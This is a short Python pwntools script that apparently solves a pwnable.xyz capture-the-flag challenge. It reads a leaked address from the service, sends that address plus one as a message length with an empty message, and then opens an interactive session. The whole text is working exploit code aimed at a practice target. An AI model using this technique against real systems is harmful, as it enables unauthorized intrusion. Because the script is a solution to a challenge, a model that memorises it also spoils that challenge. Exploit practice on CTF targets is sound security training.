from pwn import *

r = remote("svc.pwnable.xyz", 30000)

r.recvuntil(b"Leak: 0x")
mapped = int(r.recvline()[:-1], 16)

r.sendlineafter(b"Length of your message: ", str(mapped + 1).encode())
r.sendlineafter(b"Enter your message: ", b"")

r.interactive()
